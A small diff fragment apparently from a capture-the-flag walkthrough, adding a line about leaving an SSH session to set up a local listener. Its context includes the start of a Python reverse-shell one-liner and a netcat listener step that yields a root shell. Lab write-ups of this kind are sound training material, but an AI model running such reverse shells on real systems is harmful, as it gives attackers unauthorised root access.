@@ -838,6 +838,8 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 
 ##### Start a netcat listener (nc -lvp 1234) and then re-login to the SSH service. You will then receive a reverse shell on your netcat session as root!
 ==No answer needed==
+
+We can then exit our SSH session and set up a listener on our local machine:
 <div>
 <br>
 <br>
